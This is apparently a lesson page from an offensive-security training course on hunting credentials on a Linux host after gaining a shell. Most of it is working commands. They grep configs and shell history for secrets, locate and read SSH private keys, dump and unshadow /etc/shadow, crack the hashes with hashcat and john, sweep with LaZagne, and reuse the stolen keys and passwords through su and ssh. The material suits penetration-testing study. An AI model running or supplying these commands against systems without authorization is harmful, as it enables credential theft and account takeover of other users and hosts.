---
title: Hunt credentials on a Linux host
slug: hunt-credentials-linux
area: linux
module: 10
order: 1
goal: Find reusable passwords, keys and hashes already sitting on a Linux box you've landed on.
summary: How to hunt credentials on Linux — grep configs and history, loot SSH keys, pull /etc/shadow for cracking, and sweep with LaZagne, then reuse what you find.
prereqs: [A shell on the Linux host, Read access to the files you search (root for /etc/shadow), A cracker on your box for any hashes]
seeAlso: [tool:credential-hunting, tool:hashcat, tool:linux-privesc, map:credential-access, map:password-cracking]
references:
  - HackTricks: Linux privesc (credential hunting) | https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html
  - The Hacker Recipes: credential dumping | https://www.thehacker.recipes/ad/movement/credentials/dumping/
---

People leave secrets everywhere on Linux: config files, shell history, backups, SSH keys, mounted shares. A quick sweep often hands you the next user — or root — without an exploit.

## Grep the obvious places

```bash
grep -rniE 'password|passwd|secret|api[_-]?key|token' /etc /opt /var/www /home 2>/dev/null
cat ~/.bash_history /home/*/.bash_history 2>/dev/null
find / -name '*.conf' -o -name '.env' -o -name 'config.php' 2>/dev/null
```

## Loot SSH keys and known hosts

```bash
find / -name 'id_rsa' -o -name 'id_ed25519' -o -name 'authorized_keys' 2>/dev/null
cat ~/.ssh/id_rsa                                   # reuse it: ssh -i id_rsa user@host
cat ~/.ssh/known_hosts                              # where this box connects out to
```

## Grab local hashes for cracking

As root, take the password hashes and crack them offline.

```bash
unshadow /etc/passwd /etc/shadow > unshadowed.txt
hashcat -m 1800 unshadowed.txt /usr/share/wordlists/rockyou.txt   # sha512crypt ($6$)
```

## Sweep automatically

```bash
lazagne.py all                                       # browsers, mail, wifi, etc.
```

## If it fails

- **Permission denied on /etc/shadow**: you're not root yet — escalate first (Linux privesc), then come back for the hashes.
- **Encrypted SSH key**: it has a passphrase — crack it with `ssh2john id_rsa > hash && john hash`.
- **Hashcat mode wrong**: match the `$` prefix — `$6$`=1800, `$1$`=500, `$y$`/yescrypt is newer; check `/etc/shadow` first.
- **Nothing found**: widen to backups, cron scripts, database files and mounted NFS/SMB shares.

## Verify

Test a found credential before trusting it:

```bash
su - otheruser          # password reuse on the box
ssh -i id_rsa user@host # the looted key works
```
